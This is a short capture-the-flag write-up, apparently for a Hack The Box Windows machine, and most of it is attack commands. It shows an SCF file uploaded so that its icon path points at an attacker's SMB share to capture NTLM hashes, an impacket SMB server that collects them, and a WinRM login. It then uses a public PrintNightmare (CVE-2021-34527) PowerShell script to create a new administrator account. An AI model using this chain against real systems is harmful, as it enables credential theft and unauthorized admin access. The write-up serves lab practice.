we saw a file uploading page so we uploaded a scf file

```
[shell]
Command=2
IconFile=\\10.10.16.2\share\test.ico
[Taskbar]
Command=ToggleDesktop


then open smb for listening hashes 

impacket-smbserver -debug -smb2support share /home/nored0x/Desktop/HTB/driver
```

we got hash and connectede over winrm

winpeas showed console.txt and it says printer was added

```
we downloaded it https://github.com/JohnHammond/CVE-2021-34527
Import-Module .\cve-2021-34527.ps1
Invoke-Nightmare
Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 

now we did winrm and became admin
```
